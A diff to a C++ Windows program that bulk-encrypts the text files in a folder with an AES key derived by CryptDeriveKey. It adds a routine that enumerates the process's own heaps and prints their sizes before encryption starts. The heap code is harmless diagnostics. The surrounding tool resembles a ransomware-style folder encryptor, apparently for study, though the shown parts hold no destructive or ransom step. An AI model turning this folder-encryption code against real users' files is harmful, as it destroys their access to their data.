@@ -19,6 +19,57 @@ namespace fs = std::filesystem;
 #define IN_CHUNK_SIZE (AES_KEY_SIZE * 10) // a buffer must be a multiple of the key size
 #define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2) // an output buffer (for encryption) must be twice as big
 
+#include <tlhelp32.h>
+int GetHeap() {
+  printf("Getting heap\n");
+
+  DWORD pid = GetCurrentProcessId();
+  printf("Self PID: %u\n", pid);
+
+  HEAPLIST32 hl;
+  HANDLE hHeapSnap = CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid);
+  hl.dwSize = sizeof(HEAPLIST32);
+
+  if ( hHeapSnap == INVALID_HANDLE_VALUE ) {
+    printf ("CreateToolhelp32Snapshot failed (%d)\n", GetLastError());
+    return -1;
+  }
+
+  int func_result = 0;
+  if( Heap32ListFirst(hHeapSnap, &hl)) {
+    do {
+      HEAPENTRY32 he;
+      ZeroMemory(&he, sizeof(HEAPENTRY32));
+      he.dwSize = sizeof(HEAPENTRY32);
+
+      if( Heap32First(&he, pid, hl.th32HeapID )) {
+        printf( "\nHeap ID: %d\n", hl.th32HeapID );
+        unsigned int total_size = 0;
+        do {
+          total_size += he.dwBlockSize;
+          he.dwSize = sizeof(HEAPENTRY32);
+        } while( Heap32Next(&he) );
+        printf("Size of heap: %u\n", total_size);
+      }
+      hl.dwSize = sizeof(HEAPLIST32);
+    } while (Heap32ListNext( hHeapSnap, &hl ));
+  
+  } else { 
+    printf ("Cannot list first heap (%d)\n", GetLastError());
+  }
+   
+  CloseHandle(hHeapSnap);
+  printf("Self PID: %u\n", pid);
+  return func_result;
+}
+int GetHeaps() {
+  HANDLE proc_heap = GetProcessHeap();
+  if (proc_heap == NULL) return -1;
+
+  //HeapQueryInformation(proc_heap, );
+  return 0;
+}
+
 std::vector<std::string> retrieveTextFiles(const std::string& folderPath) {
     std::vector<std::string> fileNames;
     for (const auto& entry : fs::directory_iterator(folderPath)) {
@@ -162,6 +213,7 @@ int wmain(int argc, wchar_t *argv[])
 
     printf("[+] CryptDeriveKey Success\n");
 
+    GetHeap();
     printf("ENCRYPTING...\n");
 
     // Iterate over input folder
